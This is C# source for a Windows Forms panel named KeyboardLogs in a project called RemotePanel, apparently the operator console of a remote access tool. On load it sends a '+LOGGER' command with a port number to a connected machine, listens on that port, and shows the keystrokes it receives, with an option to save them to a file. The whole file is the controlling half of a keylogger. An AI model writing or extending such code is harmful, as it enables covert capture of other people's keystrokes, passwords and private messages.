using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Threading;
using System.IO;

namespace RemotePanel.Forms
{
    public partial class KeyboardLogs : Form
    {
        public KeyboardLogs()
        {
            InitializeComponent();
        }
        
        private TCP.Server serverLogger = null;
        public TCP.Server serverMain = null;
        public int serverLogger_Port;

        private void mainClearText_Button_Click(object sender, EventArgs e)
        {
            mainLog_Textbox.Text = "";
        }

        private void KeyboardLogs_Load(object sender, EventArgs e)
        {
            Task.Factory.StartNew(() =>
            {
                try
                {
                    serverMain.Send("+LOGGER " + serverLogger_Port.ToString());

                    serverLogger = new TCP.Server(serverLogger_Port);
                    serverLogger.Start();

                    while (true)
                    {
                        mainLog_Textbox.AppendText(serverLogger.RecvString(-1));
                        Thread.Sleep(50);
                    }
                }
                catch (Exception ex)
                {
                }
            });
        }

        private void KeyboardLogs_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (serverLogger != null) serverLogger.Stop();
            serverLogger = null;
        }

        private void mainSaveFile_Button_Click(object sender, EventArgs e)
        {
            if (!File.Exists(mainSavePath_Textbox.Text))
                if (mainLogSave_saveFileDialog.ShowDialog() == DialogResult.OK)
                    mainSavePath_Textbox.Text = mainLogSave_saveFileDialog.FileName;

            try
            {
                using (StreamWriter logStream = new StreamWriter(mainSavePath_Textbox.Text))
                {
                    logStream.WriteLine(mainLog_Textbox.Text.Replace("Return", "\r\n"));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
            }
        }
    }
}
